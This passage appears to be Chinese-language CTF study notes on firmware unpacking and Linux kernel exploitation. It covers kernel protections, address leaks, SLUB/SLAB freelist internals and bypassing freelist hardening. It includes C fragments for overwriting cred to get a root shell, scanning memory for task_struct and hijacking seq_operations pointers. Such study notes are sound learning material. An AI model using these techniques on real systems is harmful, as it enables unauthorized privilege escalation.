NULL\n```\n\n对应偏移找到即可\n\n![image-20220120200332572](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201202003613.png)\n\n覆盖LR寄存器为该地址完事\n\n\n\n\n\n## 7.easymsg\n\n没看懂\n\n\n\n\n\n# 二、知识点\n\n## 1.固件解包\n\n### (1)binwalk\n\n常用的命令\n\n```bash\nbinwalk -Me xxx.bin  #解包\nbinwalk -A xxx.bin #查看架构\n```\n\n有时候可以用mount挂载binwalk打不开的固件\n\n```\nmount ./rootfs.img test\n```\n\n## 2.固件加解密\n\n### (1)判断加密\n\n有时候固件可能会被加密，可用binwalk的熵计算来判断，压缩或者加密的数据具有较高的熵值\n\n```\nbinwalk -E xxx.bin\n```\n\n未加密的\n\n![image-20220121185003706](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850770.png)\n\n加密的\n\n![image-20220121185022780](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850841.png)\n\n### (2)解密常见方法\n\n逆向，自己寻找等等\n\n## 3.固件寻找\n\n网上，官网啥的，或者硬件提取，反正到时候再看一遍把，服务器，吾爱破解...\n\n观察以下\n\n![image-20220121185648863](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211856001.png)\n","tags":["2021HWS固件学习"],"categories":["2021HWS固件学习"]},{"title":"kernel笔记汇总","url":"/2022/01/14/kernel笔记汇总/","content":"# 一、常见保护\n\n## 1.KPTI\n\n在v4.15之后会默认开启\n\n内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码\n\n即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过\n\n[Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/240006#h3-2)\n\n```\ncat /sys/devices/system/cpu/vulnerabilities/*\n```\n\n![image.png](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png)\n\n这个也有类似的启动脚本\n\n```\n-append \"console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on\" \\\n```\n\n## 2.SMEP、SMAP、KASLR等\n\n这个直接看启动脚本\n\n### (1)SMEP和SMAP\n\n可以通过ROP修改CR3寄存器来绕过\n\n### (2)KASLR\n\n通常需要泄露地址，可以通过以下命令查看当前基地址\n\n```\ncat /proc/kallsyms | grep startup_64\n```\n\n![image-20220118120655137](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png)\n\n但是也可以爆破，KASLR的随机化程度只有9bit，还是比较好爆破的，参考之后的爆破KASLR的模板\n\n\n\n## 3.其他保护\n\n### (1)STACK PROTECTOR\n\n类似用户态的cancary\n\n### (2)参考README.MD\n\n有时候出题人给的README.MD会给配置\n\n```\nCONFIG_SLAB=y\nCONFIG_SLAB_FREELIST_RANDOM=y\nCONFIG_SLAB_FREELIST_HARDENED=y\nCONFIG_HARDENED_USERCOPY=y\nCONFIG_STATIC_USERMODEHELPER=y\nCONFIG_STATIC_USERMODEHELPER_PATH=\"\"\n```\n\n如上就是使用SLAB分配，开启RANDOM和HARDENED保护，以及Hardened Usercopy（内核空间指针也会进行非常严格的安全性检查，包括不允许为空指针、不允许指向 `kmalloc` 分配的零长度区域、不允许指向内核代码段、如果指向 Slab 则不允许超过 Slab 分配器分配的长度、如果涉及到栈则不允许超出当前进程的栈空间等等。）和 `Static Usermodehelper Path`（modprobe_path 为只读，不可修改）\n\n参考：[【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3's blog](https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/)\n\n\n\n\n\n\n\n# 二、泄露地址\n\n一般是开启KASLR的时候寻找地址\n\n参照：[信息泄漏 - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/kernel-mode/defense/access-control/information-disclosure/)\n\n## 1.常用方法\n\n### Dmesg\n\n显示启动时的一些信息，其中肯定包含很多函数地址\n\n当设置如下即不能再用\n\n- 启动时`echo 1 > /proc/sys/kernel/dmesg_restrict`，即设置`dmesg_restrict`为1\n- 编译内核时`CONFIG_SECURITY_DMESG_RESTRICT=y`，这个效果等同\n\n### kallsyms\n\n保存所有函数地址(全局的、静态的)和非栈数据变量地址\n\n当其中的值如下时对应所示情况，一般题目启动时直接\n\n`echo 2 > /proc/sys/kernel/kptr_restrict`\n\n- 0：默认情况下，没有任何限制。\n- 1：使用 `％pK` 输出的内核指针地址将被替换为 0，除非用户具有`CAP_ SYSLOG`特权，并且 `group id`和真正的 id 相等。(这个不太懂，root用户就可以看到)\n- 2：使用 `％pK` 输出的内核指针都将被替换为 0 ，即与权限无关。(root用户也看不到，需要在启动时去掉这个才行)\n\n### module\n\n这个是用来获取模块加载地址的\n\n```bash\ncat /sys/module/module_name/sections/.text\n```\n\n但是当编程时故意将模块隐藏起来的话，就不会被查看到了，下面有讲到。\n\n\n\n# 三、下载generic版本内核\n\n```bash\napt search linux|grep linux-image\n```\n\n肯定不太全，当然不同的apt源对应不同的，所以还是学会自己编译内核最好。\n\n这种方法下载下来没有符号表，可以通过[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)来获取符号表\n\n\n\n# 四、打印地址\n\n## 1.常规打印\n\n```\nprintf(\"0x%lx\\n\",leakAddr);\n```\n\n有时候不加`\\n`打不出来\n\n```\n#define HEX(x) printf(\"[*]0x%016lx\\n\", (size_t)x)\n#define LOG(addr) printf(\"[*]%s\\n\", addr)\n```\n\n## 2.gdb式打印\n\n```c\nvoid gdbPrint(size_t* data,int len)\n{\n    int rowLen = 0;\n    for(int i = 0 ; i < len/0x10 ; i ++)\n    {\n        printf(\"0x%04x\\t\",rowLen);\n        printf(\"0x%016llx  \",*data++);\n        printf(\"0x%016llx\\n\",*data++);\n        rowLen = rowLen+0x10;\n    }\n}\n\nchar data[0x50];\nmemset(data,'\\xaa', 0x10);\nmemset(data+0x10,'\\xbb', 0x20);\ngdbPrint(data,0x50);\n```\n\n实现效果\n\n![image-20220512151331110](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512151331110.png)\n\n## 3.颜色打印\n\n\n\n\n\n# 五、搜索内存\n\n当不知道内存在哪里时，可以使用peda的搜索功能，搜索地址范围，常常在操控栈时很好用\n\n```\nfind \"galf\" 0xffffc900001d3f80 0xffffc900001d3f98\n```\n\n![image-20220114170510292](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png)\n\n\n\n\n\n# 六、常见漏洞及利用\n\n## 1.堆\n\n### 前置知识\n\n#### 分配方式\n\n通常而言为两种分配方式SLUB或者SLAB，SLUB默认会带上SLAB，但是可以进行设置，比如在编译内核的时候，使用`CONFIG_SLUB=n`， `CONFIG_SLAB=y`这样编译出来的内核就一定是SLAB分配的了。\n\n#### 分配基地址\n\nkmalloc 从线性映射区分配内存，这块区域的线性地址到物理地址空间的映射是**连续的**，其起始地址为 `page_offset_base`，在不开启KASLR的情况如下：\n\n![image-20220325143607447](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203251436512.png)\n\n#### kmalloc_caches\n\n作为一个`kmem_cache`的结构体数组，管理着多个`kmem_cache`结构体指针。\n\n![image-20220313124755307](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png)\n\n但是不同版本下，由于分配方式的不同，导致也会`kmalloc_caches`的结构有点变化\n\n比如在4.19.98的版本中，`kmalloc_caches`就只是一维数组\n\n![image-20220313161710623](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png)\n\n而在5.6的版本下，`kmalloc_caches`变成了二维数组\n\n![image-20220313161749775](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png)\n\n多出来的两个一维空间，就存放了`kmalloc-rcl`和`dma-kmalloc`，实际上也是相同的\n\n\n\n\n\n#### SLUB下\n\n通常我们分配的chunk的`freelist`为`kmalloc_caches[xx].cpu_slab.freelist + CPUX_addr`，也就是先得到对应CPU分配的基地址，然后加上`cpu_slab.freelist `即为对应`kmalloc-xx`的`freelist`的实际地址，如下图可以看到\n\n![image-20220316201816364](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png)\n\n这里我在itExp中绑定了使用CPU3进行分配\n\n```c\n#define __USE_GNU\n#include <sched.h>\n\ncpu_set_t cpu_mask;\nCPU_ZERO(&cpu_mask);//初始化为0\nCPU_SET(3,&cpu_mask);//绑定CPU3运行程序\nsched_setaffinity(getpid(), sizeof(cpu_mask), &cpu_mask);\n```\n\n##### 一维kmalloc_caches\n\n`kmalloc_caches[1]~kmalloc_caches[13]`为`kmalloc-8`~`kmalloc-8k`\n\n而在只有一维空间的`kmalloc_caches`中，即不存在`kmalloc-rcl`和`dma-kmalloc`的版本下，比如4.19.98\n\n如下图可以看到，也是很顺利地放入CPU3对应的`kmalloc-32`的`freelist`中\n\n![image-20220314122243323](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png)\n\n但是CPU个数的不同，分配的基地址通常也会发生变化，这个具体还是看`__per_cpu_offset`这个全局变量中保存的内容吧，具体的细节不太知道\n\n![image-20220316201020862](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png)\n\n如图为4个CPU的情况，这个还是不太一样的。\n\n\n\n##### 多维kmalloc_caches\n\n`kmalloc_caches[0][1]~kmalloc_caches[0][13]`为`kmalloc-8`~`kmalloc-8k`\n\n`kmalloc_caches[1][1]~kmalloc_caches[1][13]`为`kmalloc-rcl-8`~`kmalloc-rcl-8k`\n\n`kmalloc_caches[2][1]~kmalloc_caches[2][13]`为`dma-kmalloc-8`~`dma-kmalloc-8k`\n\n![image-20220313160048795](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png)\n\n内存管理如下\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png)\n\n在二维空间的`kmalloc_caches`下，依据CPU的不同，有不同的`freelist`，比如在有4个CPU的情况下，我们将程序绑定在CPU3上，如上面提到的一样\n\nqemu启动效果之后，输入top，效果如下\n\n![image-20220314120253236](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png)\n\n\n\n那么我们的`itExp`程序绑定的CPU3分配到的基地址即为`0xffff88800f380000`，结合`kmalloc_caches`中对应`kmalloc-xxx`下的`cpu_slab.freelist `\n\n![image-20220314120914190](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png)\n\n那么我们的`kmalloc-32`的`freelist`即为`0xffff88800f380000+0x2d260`，如下图可以看到，我们释放的chunk确实是放入了CPU3上对应的`kmalloc-32`的`freelist`中\n\n![image-20220316202605604](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png)\n\n当然，在SLUB分配下，由于FD指针的存在，freelist更像是一个单向链表，freelist中的第一个chunk作为链表头依据FD指针串联起整个freelist\n\n\n\n#### 仅SLAB下\n\n同样也具备多维或者一维的`kmalloc_caches`\n\n`kmalloc_caches[0][1]~kmalloc_caches[0][2]`为`kmalloc-96~kmalloc-192`\n\n`kmalloc_caches[0][3]~kmalloc_caches[0][4]`不知道为什么没有\n\n`kmalloc_caches[0][5]~kmalloc_caches[0][22]`为`kmalloc-32~kmalloc-4M`\n\n同理对应的多维和一维也是类似的\n\n![image-20220313160119681](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png)\n\n分配方式上有点不同，具体的比较复杂，可以参考如下：\n\n[(41条消息) slab内存管理方案学习记录_liuhangtiant的博客-CSDN博客](https://blog.csdn.net/liuhangtiant/category_7929217.html)\n\n这种情况下的Chunk其实不带FD指针的，所以只用于`freelist`上即可，简单来说，slab的`freelist`更像是一个数组进行索引。\n\n- 首先找到索引，也就是`CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.avail`对应的值，以`CPU3`和`kmalloc-1024`为例：\n\n![image-20220316203909895](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png)\n\n- 然后再找到`freelist`的地址，即`CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry`\n\n![image-20220316204056370](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png)\n\n其实通过观察我们可以知道，`entry`其实也就是`cpu_cache+0x10`而已。那么现在我们得到freelist的地址，就将其当作一个数组进行取用，比如这里的索引idx为2，那么我们下一次分配就会取freelist[2]这个obj，但是这里很奇怪，这个索引是从1开始的，如下：\n\n![image-20220316204603914](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png)\n\n下一次分配取到`chunk`是`0xffff88800d538400`而非`0xffff88800d538c00`，我感觉这个索引idx更像是一个计数，表示还剩2个chunk可用，从尾部开始取用\n\n##### 🔺注：\n\n当然以上的情况实际操作起来太麻烦，还不如写个小插件，自己进行计算\n\n参考自己写的小工具：[PIG-007/kernelAll (github.com)](https://github.com/PIG-007/kernelAll)\n\n###### SLAB：\n\n![image-20220316204859800](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png)\n\n###### SLUB：\n\n这个带上了计算swab和random值得功能，也就是开启了harden的情况下，当然也还有FD偏移位置改变的情况，不过需要设置\n\n![image-20220316205100876](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png)\n\n\n\n### 修改cred结构体\n\n这个就不用说太多，通常是0xa8大小的结构体，清空前28字节\n\n```c\nchar credBuf[0xa8] = {0};\naddFun(fd,0xa8,credBuf);\nfreeFun(fd,0);\n\nidFork = fork();\nif(idFork == 0){\n    //get into 28*0 to set uid and gid 0\n    editFun(fd,0,28,credBuf);\n    if(getuid() == 0){\n        printf(\"[*]welcome root:\\n\");\n        system(\"/bin/sh\");\n        return 0;\n    }\n}\nelse if(idFork < 0){\n    printf(\"[*]fork fail\\n\");\n}\nelse{\n    wait(NULL);\n}\n```\n\n### 修改FD申请\n\n#### (1)HARDENED保护\n\n不过从4.14的内核版本开始，就存在`freelist_ptr`加密了，不过需要在编译内核的时候加入`CONFIG_SLAB_FREELIST_HARDENED`选项来启用，并且加密形式在不同版本不太一样。\n\n```c\n//v4.14\nstatic inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,\n\t\t\t\t unsigned long ptr_addr)\n{\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\treturn (void *)((unsigned long)ptr ^ s->random ^ ptr_addr);\n#else\n\treturn ptr;\n#endif\n}\n\n\n//v5.16\nstatic inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,\n\t\t\t\t unsigned long ptr_addr)\n{\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\t/*\n\t * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.\n\t * Normally, this doesn't cause any issues, as both set_freepointer()\n\t * and get_freepointer() are called with a pointer with the same tag.\n\t * However, there are some issues with CONFIG_SLUB_DEBUG code. For\n\t * example, when __free_slub() iterates over objects in a cache, it\n\t * passes untagged pointers to check_object(). check_object() in turns\n\t * calls get_freepointer() with an untagged pointer, which causes the\n\t * freepointer to be restored incorrectly.\n\t */\n\treturn (void *)((unsigned long)ptr ^ s->random ^\n\t\t\tswab((unsigned long)kasan_reset_tag((void *)ptr_addr)));\n#else\n\treturn ptr;\n#endif\n}\n```\n\n这里的`ptr`即当前释放的chunk地址，ptr_addr为指向下一个free_chunk的地址，所以中间相当于有一个random值不知道。这个值在`linux/slub_def.h`中被定义\n\n```c\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\tunsigned long random;\n#endif\n```\n\n并且在`mm/slub.c`中的`kmem_cache_open`函数中被赋值\n\n```C\nstatic int kmem_cache_open(struct kmem_cache *s, slab_flags_t flags)\n{\n\ts->flags = kmem_cache_flags(s->size, flags, s->name, s->ctor);\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\ts->random = get_random_long();\n#endif\n```\n\n参考[Slub Freelist Hardened (rtfingc.github.io)](https://rtfingc.github.io/slub-freelist-hardened)\n\n这里需要我们获得random的值，这个值保存在对于size的kmem_cache中，该结构体定义在`/linux/slub_def.h`中如下\n\n```c\n//v4.17\nstruct kmem_cache {\n\tstruct kmem_cache_cpu __percpu *cpu_slab;\n\t/* Used for retriving partial slabs etc */\n\tslab_flags_t flags;\n\tunsigned long min_partial;\n\tunsigned int size;\t/* The size of an object including meta data */\n\tunsigned int object_size;/* The size of an object without meta data */\n\tunsigned int offset;\t/* Free pointer offset. */\n#ifdef CONFIG_SLUB_CPU_PARTIAL\n\t/* Number of per cpu partial objects to keep around */\n\tunsigned int cpu_partial;\n#endif\n\tstruct kmem_cache_order_objects oo;\n\n\t/* Allocation and freeing of slabs */\n\tstruct kmem_cache_order_objects max;\n\tstruct kmem_cache_order_objects min;\n\tgfp_t allocflags;\t/* gfp flags to use on each alloc */\n\tint refcount;\t\t/* Refcount for slab cache destroy */\n\tvoid (*ctor)(void *);\n\tunsigned int inuse;\t\t/* Offset to metadata */\n\tunsigned int align;\t\t/* Alignment */\n\tunsigned int reserved;\t\t/* Reserved bytes at the end of slabs */\n\tunsigned int red_left_pad;\t/* Left redzone padding size */\n\tconst char *name;\t/* Name (only for display!) */\n\tstruct list_head list;\t/* List of slab caches */\n#ifdef CONFIG_SYSFS\n\tstruct kobject kobj;\t/* For sysfs */\n\tstruct work_struct kobj_remove_work;\n#endif\n#ifdef CONFIG_MEMCG\n\tstruct memcg_cache_params memcg_params;\n\t/* for propagation, maximum size of a stored attr */\n\tunsigned int max_attr_size;\n#ifdef CONFIG_SYSFS\n\tstruct kset *memcg_kset;\n#endif\n#endif\n\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\tunsigned long random;\n#endif\n\n#ifdef CONFIG_NUMA\n\t/*\n\t * Defragmentation by allocating from a remote node.\n\t */\n\tunsigned int remote_node_defrag_ratio;\n#endif\n\n#ifdef CONFIG_SLAB_FREELIST_RANDOM\n\tunsigned int *random_seq;\n#endif\n\n#ifdef CONFIG_KASAN\n\tstruct kasan_cache kasan_info;\n#endif\n\n\tunsigned int useroffset;\t/* Usercopy region offset */\n\tunsigned int usersize;\t\t/* Usercopy region size */\n\n\tstruct kmem_cache_node *node[MAX_NUMNODES];\n};\n```\n\n并且不同size的kmem_cache对应的random不同。\n\n在有DEBUG信息的内核中，我们尝试寻找0x10大小的kmem_cache比如我们寻找0x10大小的就需要在保存所有kmem_cache的全局变量结构kmalloc_caches中寻找，不过需要注意的是，好像很多时候不是按照顺序来排布的，如下图，我们就需要寻找kmalloc-16，但是这里它的索引为4，而不是2，不知道为什么。\n\n![image-20220116152127879](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png)\n\n另外kmalloc_caches[0]并不是一个kmem_cache结构的，而是一个其他类型，暂时不知道用来干啥。\n\n![image-20220116152404345](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png)\n\n那么回到正题，先寻找下random，这个就是0x10大小的kmem_cache中保存的random值了。\n\n![image-20220116152450367](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png)\n\n那么我们得到random值就可以算出下一个chunk在哪里了\n\n![image-20220116152702584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png)\n\n但是通常意义上如果开启了这个保护，我们是得不到堆地址的，最多得到保护之后的fd的值，没办法算出来random的值，但是由于是异或了当前堆地址ptr和堆地址+size(ptr_addr)，那么我们对size做文章，这样可以找出一些规律。\n\n参考[slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/259280#h3-15)\n\n##### 🔺注：\n\n在该内核下的同一个size的kmem_cache的random值不管启动多少次都是固定的，无论有没有开启KASLR。（至少我在本地测的时候是如此的）\n\n###### 未开启KASLR\n\n![image-20220118124309671](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png)\n\n###### 开启KASLR\n\n![image-20220118124331545](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png)\n\n可以看到都是一致的。\n\n但是放到题目中就不太确定了，就是将题目在本地运行测出来的random值和题目在远程运行测出来的random值是不是也是一样的呢，之前的西湖的easy_kernel题中貌似是一样的，但是我并没有实际测试，因为还没碰到..下回换个机器测试下。或者说和qemu还是环境cpu都有关系吗，期待大佬回答。\n\n而且在后面的**新版的HARDENED**中也有提到，加入swab运算之后，貌似会对random值再做一个低2个字节的处理，这个是怎么处理的呢，还是有点不太懂。\n\n##### ①0x8为例\n\n0x10对齐的堆块其fd均一样，取其fd直接异或0x8即可得到kmalloc-8的random值\n\n![image-20220116170303600](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png)\n\n原因如下，0x10对齐的堆块异或其值+0x8并不会造成进位，所以异或得到的值都是一样的\n\n![image-20220116170714710](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png)\n\n##### ②0x10，0x20，0x30等等\n\n这种类型的其fd和random值一般差半个字节，大不了直接爆破，1/16的概率\n\n![image-20220116175038466](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png)\n\n并且观察可以发现，在0x10的情况下也会有重复的部分，同样的，该重复的部分异或0x10也会是random值\n\n![image-20220116175228263](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png)\n\n具体的还是自己摸索或者看一只狗师傅的：[slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/259280#h3-16)\n\n##### 泄露random\n\n以下泄露Random样例也是参照一只狗师傅的\n\n```c\nAdd(0, 0x100);\nAdd(1, 0x100);\nAdd(2, 0x100);\n\nShow(0, &FD1, 8);\nShow(1, &FD2, 8);\nShow(2, &FD3, 8);\n\nsize_t random;\nif(FD1==FD3)\n    random = FD1^0x100;\nelse\n    random = FD2^0x100;\n```\n\n##### 获得堆地址任意写\n\n但是获得堆地址不太好整，需要找到freelist的最后一个堆块last_chunk，然后其fd异或random即可得到该堆块的地址，获得堆块地址后，直接释放该堆块last_chunk，然后通过之前一个堆块pre_chunk溢出或者UAF，按照异或规则修改last_chunk的fd，就能实现任意申请了。\n\n以8192大小为例，申请到最后一个chunk时释放，然后再申请就能申请回来了。\n\n![image-20220116181547997](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png)\n\n注意获取堆地址的时候，由于不同size的kmem_cache的最大freelist数量差异较大，size越大的其freelist链表个数越少，越容易申请到最后一个。\n\n![image-20220116174436185](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png)\n\n#### (2)HARDENED新版改动\n\n##### kasan_reset_tag\n\n从v5.0开始，加了一个新的东西\n\n```c\nkasan_reset_tag((void *)ptr_addr));\n```\n\n这个不知道用来干啥的，有点蒙圈\n\n```\n//linux/kasan.h\nstatic inline void *kasan_reset_tag(const void *addr)\n{\n\treturn (void *)addr;\n}\n```\n\n\n\n##### swab\n\n从v5.6.4开始，又加了一个运算\n\n```c\nswab(kasan_reset_tag((void *)ptr_addr)));\n```\n\n本质上是大小端互换，比如\n\n```c\nint before = 0xaabbccdd;\nint after = swab(before);\nafter == 0xddccbbaa;\n```\n\n这个直接解，参照哪个师傅的来着，忘记了.....\n\n```c\n#define __u64 u_int64_t\n#define swab64(x) ((__u64)((((__u64)(x) & (__u64)0x00000000000000ffULL) << 56) | \\\n        (((__u64)(x) & (__u64)0x000000000000ff00ULL) << 40) | \\\n        (((__u64)(x) & (__u64)0x0000000000ff0000ULL) << 24) | \\\n        (((__u64)(x) & (__u64)0x00000000ff000000ULL) << 8)  | \\\n        (((__u64)(x) & (__u64)0x000000ff00000000ULL) >> 8)  | \\\n        (((__u64)(x) & (__u64)0x0000ff0000000000ULL) >> 24) | \\\n        (((__u64)(x) & (__u64)0x00ff000000000000ULL) >> 40) | \\\n        (((__u64)(x) & (__u64)0xff00000000000000ULL) >> 56)))\n```\n\n然后又不知道从哪个版本开始，FD的存放位置发生改变，放在了chunk_addr+(size/2)的位置上，以0x80大小的chunk为例子(反正v5.0没有，v5.7有)\n\n![image-20220117105059115](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png)\n\n此外计算方式也有点变化，ptr_addr不再是当前chunk的地址，而是FD的地址，同时还是会与上面的运算做一个简单的合并:\n\n```c\nFD_addr == chunk_addr + size/2\nFD_value == random ^ swab(FD_addr) ^ next_chunk_addr\n```\n\n所以当我们本地把random值测出来之后，再依据freelist的最后一个直接改next_addr然后套入上述公式，获得FD值，将FD值写入即可完成上述任意堆块申请。（但是远程还没有试过，想来依据最近的easy_kernel中测出来的情况应该是random值也是不变的）\n\n同样的当位于freelist的最后一个chunk时，next_chunk_addr = 0，上述公式就变成如下\n\n```c\nFD_addr == chunk_addr + size/2\nFD_value == random ^ swab(FD_addr)\n```\n\n进而可以测出FD_addr，得到chunk的地址。当然，前提是建立在远程的random值不会发生改变。\n\n如果远程的random值会发生改变的话，那么直接将当前FD_value异或需要劫持的fake_chunk_addr，那么一直将freelist申请完，之后再接着申请就能得到fake_chunk_addr。这种情况我们可以借助连续的两个FD_value中间4个字节是否发生改变来进行判断，如果改变了，那么代表freelist即将结束，这时候就可以进行修改了。不过修改之后，该size的`kmem_cache`的freelist链表就会损坏，要么重新修复，要么就申请其他size的`kmem_cache`。\n\n但是还有一个问题就是，如果开了下面的`RANDOM`保护，那么我们测出来的random值其实就不一定准确了，因为freelist中的chunk地址不是连续的，我们用连续的地址来测势必导致测出来的random值的低2个字节不同，这时候就需要申请到freelist的最后一个chunk，取得其FD值的低2个字节和我们之前测出来的random一合并就是最终的random值了。不过这个怎么判断是freelist的最后一个chunk也有点问题...\n\n\n\n##### double_free\n\n在开启了HARDENED这种情况下，对于FD指针会添加一个检测\n\n```c\n//mm/slub.c\nstatic inline void set_freepointer(struct kmem_cache *s, void *object, void *fp)\n{\n\tunsigned long freeptr_addr = (unsigned long)object + s->offset;\n\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\tBUG_ON(object == fp); /* naive detection of double free or corruption */\n#endif\n\n\t*(void **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);\n}\n```\n\n检测double_free，其实就相当于是fastbin中的double_free检测，检测freelist中的第一个和即将放进入freelist中的chunk是否相等。\n\n![image-20220308235157003](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png)\n\n所以同理可得，也可以说如下，在中间加入一个chunk的free即可绕过\n\n```\nfree chunk1\nfree chunk2\nfree chunk1\n```\n\n但是在内核环境下，啥时候都可能碰到申请chunk，所以有时候可能再申请的时候不能成功申请到chunk1->chunk2->chunk1的顺序\n\n这时候如果最好还是绑定到一个CPU上\n\n```c\n// 绑定到一个cpu上\nunsigned char cpu_mask = 0x01;\nsched_setaffinity(0, 1, &cpu_mask);\n```\n\n\n\n#### (3)RANDOM保护\n\n在v4.7及之后存在，编译内核时加入`CONFIG_SLAB_FREELIST_RANDOM=y`选项，会启用`Fisher-Yates`随机排列算法打乱freelist的顺序\n\n这个情况下每次更新freelist的时候，会打乱freelist中空闲的chunk，造成无法简单申请到指定的chunk，不过我们可以修改FD之后，多次申请，也可以申请到修改之后的chunk。\n\n也是参考[Slub Freelist Hardened (rtfingc.github.io)](https://rtfingc.github.io/slub-freelist-hardened)\n\n### 借助prctl函数寻找cred地址\n\n🔺注：需要存在任意读\n\nprctl函数的PR_SET_NAME功能可以设置task_struct结构体中的comm[TASK_COMM_LEN]成员。\n\n```c\nchar target[16];\nstrcpy(target,\"tryToFindPIG007\");\nprctl(PR_SET_NAME,target);\n```\n\n然后内存搜索定位\n\n```c\n//search target chr\nchar *buf = (char *)calloc(1,0x1000);\nputs(\"[+] we can read and write any memory\");\nfor(;addr<0xffffc80000000000;addr+=0x1000){\n    arbitrary_read(devFD,0x1000,buf,addr);\n    result=memmem(buf,0x1000,target,16);\n    if (result){\n        printf(\"result:%p\\n\",result);\n        cred= * (size_t *)(result-0x8);\n        real_cred= *(size_t *)(result-0x10);\n        if ((cred||0xff00000000000000) && (real_cred == cred))\n        {\n            target_addr=addr+result-(int)(buf);\n            printf(\"[+]found task_struct 0x%lx\\n\",target_addr);\n            printf(\"[+]found cred 0x%lx\\n\",real_cred);\n            break;\n        }\n    }\n}\n```\n\n之后再借用任意写或者修改FD申请来修改cred结构中的内容即可。\n\n\n\n\n\n### 借助stat设备修改函数指针\n\n原理就是劫持`seq_operations`结构体的函数指针，进而控制程序流。\n\n西湖论剑--easy_kernel\n\n[西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/260055#h3-5)\n\n有如下结构体，大小为0x20，当我们可以申请0x20大小的Chunk，然后释放，再打开`/proc/self/stat`设备就可以得到该结构体。\n\n```\nstruct seq_operations {\n    void * (*start) (struct seq_file *m, loff_t *pos);\n    void (*stop) (struct seq_file *m, void *v);\n    void * (*next) (struct seq_file *m, void *v, loff_t *pos);\n    int (*show) (struct seq_file *m, void *v);\n};\n```\n\n如果存在UAF之类的就可以从里面读取函数偏移，获得kernel基地址，然后还可以修改里面的start函数指针，劫持使其指向我们的gadget，当我们对该设备进行读取操作时，就会调用该start指针，从而进入到我们劫持的gadget，进而可以程序控制执行流。使用如下汇编进行对该设备的操作。\n\n```c\n\"xor rax, rax;\"\n\"mov rcx, 0x666666;\"\n\"mov rdx, 8;\"\n\"mov rsi, rsp;\"\n\"mov rdi, seq_fd;\"\n\"syscall\"\n```\n\n劫持之后再需要getshell就需要注意另一个结构体了\n\n```c\nstruct pt_regs {\n/*\n * C ABI says these regs are callee-preserved. They aren't saved on kernel entry\n * unless syscall needs a complete, fully filled \"struct pt_regs\".\n */\n    unsigned long r15;\n    unsigned long r14;\n    unsigned long r13;\n    unsigned long r12;\n    unsigned long rbp;\n    unsigned long rbx;\n/* These regs are callee-clobbered. Always saved on kernel entry. */\n    unsigned long r11;\n    unsigned long r10;\n    unsigned long r9;\n    unsigned long r8;\n    unsigned long rax;\n    unsigned long 